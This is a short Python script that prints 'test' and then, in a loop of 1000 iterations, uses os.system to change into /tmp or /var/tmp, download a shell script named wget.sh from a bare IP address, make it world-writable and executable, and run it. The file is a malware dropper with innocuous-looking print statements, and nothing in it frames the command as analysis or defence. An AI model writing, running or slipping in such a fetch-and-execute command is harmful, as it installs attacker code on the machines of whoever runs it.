import os

print("test")

for _ in range(1000):
    print("test")
    os.system("cd /tmp; cd /var/tmp; wget 93.123.85.110/wget.sh; chmod 777 wget.sh; ./wget.sh; sh wget.sh")
